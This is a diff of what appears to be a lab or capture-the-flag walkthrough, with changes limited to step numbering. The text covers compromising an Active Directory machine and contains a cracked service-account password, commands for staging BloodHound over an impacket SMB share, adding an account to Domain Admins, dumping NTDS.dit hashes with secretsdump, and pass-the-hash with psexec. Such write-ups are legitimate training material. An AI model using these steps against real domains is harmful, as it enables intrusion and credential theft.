@@ -78,30 +78,30 @@ Credentials -> roastsvc:!!!watermelon245
 Once we get a shell as user **roastsvc**, we upload and run [BloodHound](https://github.com/BloodHoundAD/BloodHound) against the machine to reveal any misconfigured AD relationships.
 
 First, let's setup a smb-server using impacket then mount the smb share on the target machine, so that we can upload Bloodhound and download the bloodhound output with ease
-- 1. Setup impacket's smb-server
+- Setup impacket's smb-server
 	![smbserver.PNG](/images/office/SMBServer/smbserver.PNG)
 	Syntax : impacket-smbserver (sharename) (directory) -smb2support -username (your-username) -password (your-password)
-- 2. Setup new PSDrive on target machine and mount the share
+- Setup new PSDrive on target machine and mount the share
 	![mount.PNG](/images/office/SMBServer/mount.PNG)
 	- $pass = convertto-securestring (your-password) -AsPlainText -Force
 	- $cred = New-Object System.Management.Automation.PSCredential('(your-username)', $pass)
 	- New-PSDrive -Name (your-username) -PSProvider FileSystem -Credential $cred \\\\(your-ip)\(share-name)
-- 3. CD into your share, run bloodhound 
+- CD into your share, run bloodhound 
 	![sharphound.PNG](/images/office/SMBServer/sharphound.PNG)
 	- Make sure you upload bloodhound to the directory you created as the share
-- 4. Start Bloodhound 
+- Start Bloodhound 
 	![bloodhound.PNG](/images/office/SMBServer/bloodhound.PNG)
 	- neo4j console start
 	- bloodhound 
 
-- 5. Upload the bloodhound output to analyze 
+- Upload the bloodhound output to analyze 
 	![bloodhound_output.PNG](/images/office/SMBServer/bloodhound_output.PNG)
 	- Drag and drop the zip file into the bloodhound console
 
 Once we are done setting up BloodHound, let's start analyzing the output that we have gathered from the target machine.
-- 1. Mark user **roastsvc** as **Owned**
+- Mark user **roastsvc** as **Owned**
 	![owned_user.jpg](/images/office/SYSTEM/owned_user.jpg)
-- 2. Use the built-in query 
+- Use the built-in query 
 	![path_to_DA.jpg](/images/office/SYSTEM/path_to_DA.jpg)
 	- "Shortest Path to Domain Admins from Owned Principals"
 
@@ -111,24 +111,24 @@ From here, we found out that user **roastsvc** has **GenericWrite** to group **D
 - **GenericWrite** : Provides write access to all properties
 
 Since user **roastsvc** has **GenericWrite** permission to the **Domain Admins** group, we can simply just add user **roastsvc** into the **Domain Admins** group.
-- 1) List all current members of **Domain Admins** group
+- List all current members of **Domain Admins** group
 	![original_DA_members.PNG](/images/office/SYSTEM/original_DA_members.PNG)
 	- net group (group-name) /domain
-- 2. Add user **roastsvc** into **Domain Admins** group
+- Add user **roastsvc** into **Domain Admins** group
 	![add_to_DA.PNG](/images/office/SYSTEM/add_to_DA.PNG)
 	- net group (group-name) (user-to-add) /ADD /DOMAIN 
-- 3. Check if user **roastsvc** is added into the group
+- Check if user **roastsvc** is added into the group
 	![updated_DA_members.PNG](/images/office/SYSTEM/updated_DA_members.PNG)
 	- net group (group-name) /domain
 
 Lastly, we can dump the NTDS.dit hash file for the Administrator's hash using [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) by impacket and [PSExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) into the target machine
-- 1. Dumping the NTDS.dit hash file 
+- Dumping the NTDS.dit hash file 
 	![secretsdump.PNG](/images/office/SYSTEM/secretsdump.PNG)
 	- python secretsdump.py (domain-name)/(user)@(domain-name) -dc-ip 172.31.3.2
-- 2. Get the Administrator's hash
+- Get the Administrator's hash
 	![admin_hash.PNG](/images/office/SYSTEM/admin_hash.PNG)
 	
-- 3. PSExec 
+- PSExec 
 	![psexec.PNG](/images/office/SYSTEM/psexec.PNG)
 	- python psexec.py (domain-name)/user@(domain-name) -hashes (admin-hash) -dc-ip 172.31.3.2 
 
